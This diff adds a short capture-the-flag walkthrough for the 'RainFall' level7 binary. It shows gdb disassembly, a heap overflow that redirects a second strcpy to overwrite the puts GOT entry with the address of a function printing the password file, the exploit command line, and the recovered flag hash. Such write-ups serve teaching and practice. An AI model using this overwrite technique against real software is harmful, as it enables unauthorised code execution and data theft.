@@ -1,0 +1,28 @@
+(gdb) disassemble main
+
+0x08048531 <+16>:	call   0x80483f0 <malloc@plt> // x4
+0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt> // x2
+0x080485d3 <+178>:	call   0x8048430 <fopen@plt> // open .pass file
+0x080485eb <+202>:	call   0x80483c0 <fgets@plt>	// write its content to buffer c 0x8049960
+I get that there are 2 allocated buffers where strcpy copies the argv 1 and 2, by overflowing the first buffer,I poke into the address where the second writes, so I can now change the address where the second strcpy writes.
+
+ 0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+
+(gdb) disassemble 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+
+(gdb) x 0x8049928
+0x8049928 <puts@got.plt>:	0x08048406
+
+I will change the got address for puts to the m function that prints the buffer where  fgets wrote the content of .pass file.
+  
+(gdb) r AAAABBBBCCCCDDDDEEEE`python -c "print('\x28\x99\x04\x08')"` `python -c "print ('\xf4\x84\x04\x08')"`
+
+(gdb) x 0x8049928
+0x8049928 <puts@got.plt>:	0x080484f4 // m address
+
+level7@RainFall:~$ /home/user/level7/level7 AAAABBBBCCCCDDDDEEEE`python -c "print('\x28\x99\x04\x08')"` `python -c "print ('\xf4\x84\x04\x08')"`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1655473904
+
